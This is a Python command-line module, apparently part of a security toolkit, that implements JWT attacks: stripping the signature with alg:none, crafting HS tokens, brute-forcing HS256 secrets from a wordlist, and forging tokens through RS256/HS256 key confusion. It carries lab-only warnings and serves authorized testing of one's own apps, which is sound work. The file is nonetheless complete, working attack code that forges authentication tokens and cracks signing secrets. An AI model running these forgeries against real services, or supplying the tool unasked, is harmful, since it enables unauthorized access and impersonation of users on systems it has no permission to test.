#!/usr/bin/env python3
"""JWT security tester — LAB USE ONLY.

Builds the classic forged-token attacks so you can verify that YOUR sample
app rejects them. Run it only against applications you own or have written
permission to test — using forged tokens against anyone else's app is
unauthorized access (India: IT Act, 2000 §66).

What each attack teaches:
- none      rewrite alg to "none" and strip the signature — catches apps
            that trust the header's alg field
- craft     mint a token from scratch (any alg/claims) with a secret you hold
- weak-secret   dictionary-attack the HS256 secret (weak app secrets like
            "secret", "your-256-bit-secret" are everywhere)
- key-confusion  take an RS256 token's PUBLIC key and re-sign the token as
            HS256 using the key bytes as the HMAC secret — catches apps whose
            verify code uses one code path for both algorithms

Requires the `cryptography` package only for the key-confusion action.

Examples:
    gravyard crypto jwt-test none --token <RS256 token>
    gravyard crypto jwt-test craft --alg HS256 --secret s3cret --claims '{"sub":"admin"}'
    gravyard crypto jwt-test weak-secret --token <token> --wordlist secrets.txt
    gravyard crypto jwt-test key-confusion --token <RS256 token> --pub-key app.pub.pem
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
from pathlib import Path

if not __package__:
    sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from core.cli import common_flags, standalone
from core.logging import get_logger
from core.output import fail, render_record, success, warn

log = get_logger("gravyard.jwt-test")
LAB_WARNING = "LAB USE ONLY — send forged tokens solely to sample apps you own"


def b64url_decode(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _json_b64(obj: dict) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":"), sort_keys=True).encode())


def _split(token: str) -> tuple[dict, dict, bytes, str, str]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        fail("expected a signed JWT (header.payload.signature)")
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError) as exc:
        fail(f"malformed JWT: {exc}")
    return header, payload, b64url_decode(parts[2]), parts[0], parts[1]


def _hs256(signing_input: bytes, secret: bytes) -> bytes:
    return hmac.new(secret, signing_input, hashlib.sha256).digest()


def _token(header: dict, payload_b64: str, signature: bytes) -> str:
    return f"{_json_b64(header)}.{payload_b64}.{b64url_encode(signature)}"


def attack_none(args) -> dict:
    header, payload, _, _, payload_b64 = _split(args.token)
    if header.get("alg") == "none":
        warn("token already has alg=none")
    header = {**header, "alg": "none"}
    forged = _token(header, payload_b64, b"")
    return {"attack": "none", "forged_token": forged,
            "note": "ends with a trailing dot and no signature — send it and watch your app"}


def attack_craft(args) -> dict:
    if args.claims is None:
        fail("craft needs --claims '{...}' (JSON object)")
    try:
        claims = json.loads(args.claims)
    except json.JSONDecodeError as exc:
        fail(f"--claims is not valid JSON: {exc}")
    header = {"typ": "JWT", "alg": args.alg, **(json.loads(args.header) if args.header else {})}
    payload_b64 = b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
    if header["alg"] == "none":
        forged = _token(header, payload_b64, b"")
    elif header["alg"].startswith("HS"):
        if not args.secret:
            fail(f"alg {header['alg']} needs --secret")
        forged = _token(header, payload_b64, _hs256(f"{_json_b64(header)}.{payload_b64}".encode(),
                                                    args.secret.encode()))
    else:
        fail(f"craft supports alg=none and HS* only (got {header['alg']})")
    return {"attack": "craft", "alg": header["alg"], "claims": claims, "forged_token": forged}


def attack_weak_secret(args) -> dict:
    header, payload, signature, head_b64, payload_b64 = _split(args.token)
    if not header.get("alg", "").startswith("HS"):
        fail(f"weak-secret attacks HS* tokens only (token alg is {header.get('alg')!r})")
    if not args.wordlist or not args.wordlist.is_file():
        fail(f"no such wordlist: {args.wordlist}")
    signing_input = f"{head_b64}.{payload_b64}".encode()
    started, tried = time.monotonic(), 0
    with args.wordlist.open("rb") as fh:
        for raw in fh:
            secret = raw.rstrip(b"\r\n")
            tried += 1
            if _hs256(signing_input, secret) == signature:
                rate = tried / max(time.monotonic() - started, 1e-9)
                success(f"secret found after {tried:,} candidates ({rate:,.0f}/s): {secret.decode('latin-1')!r}")
                return {"attack": "weak-secret", "found": True, "secret": secret.decode("latin-1"),
                        "candidates": tried}
            if tried % 200_000 == 0:
                log.info("%s candidates tried", f"{tried:,}")
    warn(f"secret not in the wordlist ({tried:,} candidates, {time.monotonic() - started:.1f}s)")
    return {"attack": "weak-secret", "found": False, "candidates": tried}


def attack_key_confusion(args) -> dict:
    try:
        from cryptography.hazmat.primitives import serialization
    except ModuleNotFoundError:
        fail("key-confusion needs the 'cryptography' package: pip install 'gravyard[crypto]'")
    if not args.pub_key or not args.pub_key.is_file():
        fail(f"no such public key file: {args.pub_key}")
    header, payload, _, _, payload_b64 = _split(args.token)
    if header.get("alg") != "RS256":
        warn(f"key-confusion targets RS256 tokens (token alg is {header.get('alg')!r}) — continuing anyway")
    pem_bytes = args.pub_key.read_bytes()
    try:
        der_bytes = serialization.load_pem_public_key(pem_bytes).public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
    except (ValueError, TypeError):
        fail(f"{args.pub_key} is not a readable public key PEM")
    header = {**header, "alg": "HS256"}
    signing_input = f"{_json_b64(header)}.{payload_b64}".encode()
    variants = {
        "pem-file-bytes": _hs256(signing_input, pem_bytes),
        "der-key-bytes": _hs256(signing_input, der_bytes),
    }
    forged = {name: _token(header, payload_b64, sig) for name, sig in variants.items()}
    return {"attack": "key-confusion", "forged_tokens": forged,
            "note": "if the app's verify accepts HS256 with the RSA key material, one of these signs in"}


ACTIONS = {"none": attack_none, "craft": attack_craft,
           "weak-secret": attack_weak_secret, "key-confusion": attack_key_confusion}


def add_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("action", choices=tuple(ACTIONS))
    parser.add_argument("--token", help="victim token from YOUR lab app")
    parser.add_argument("--claims", help="craft: payload claims as a JSON object string")
    parser.add_argument("--header", help="craft: extra header fields as a JSON object string")
    parser.add_argument("--alg", default="HS256", choices=("none", "HS256", "HS384", "HS512"),
                        help="craft: algorithm (default HS256)")
    parser.add_argument("--secret", help="craft/verify: HMAC secret")
    parser.add_argument("--wordlist", type=Path, help="weak-secret: candidate secrets, one per line")
    parser.add_argument("--pub-key", type=Path, help="key-confusion: the app's RSA public key PEM")


def run(args: argparse.Namespace) -> int:
    warn(LAB_WARNING)
    if args.action in ("none", "weak-secret", "key-confusion") and not args.token:
        fail(f"{args.action} needs --token")
    result = ACTIONS[args.action](args)
    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print(render_record({k: v for k, v in result.items() if k != "forged_tokens"}))
        for name, token in (result.get("forged_tokens") or {}).items():
            print(f"\n{name}:\n{token}")
        if "forged_token" in result:
            print(f"\nforged_token:\n{result['forged_token']}")
    return 0


def register(subparsers) -> None:
    parser = subparsers.add_parser(
        "jwt-test",
        parents=[common_flags()],
        help="forge alg:none / weak-secret / key-confusion JWTs (LAB ONLY)",
        description="JWT attack workbench: alg:none, weak-secret, key-confusion — lab use only.",
        epilog=LAB_WARNING,
    )
    add_arguments(parser)
    parser.set_defaults(func=run)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="jwt-test",
        description="JWT attack workbench: alg:none, weak-secret, key-confusion — lab use only.",
        epilog=LAB_WARNING,
        parents=[common_flags()],
    )
    add_arguments(parser)
    parser.set_defaults(func=run)
    return standalone(parser, argv)


if __name__ == "__main__":
    raise SystemExit(main())
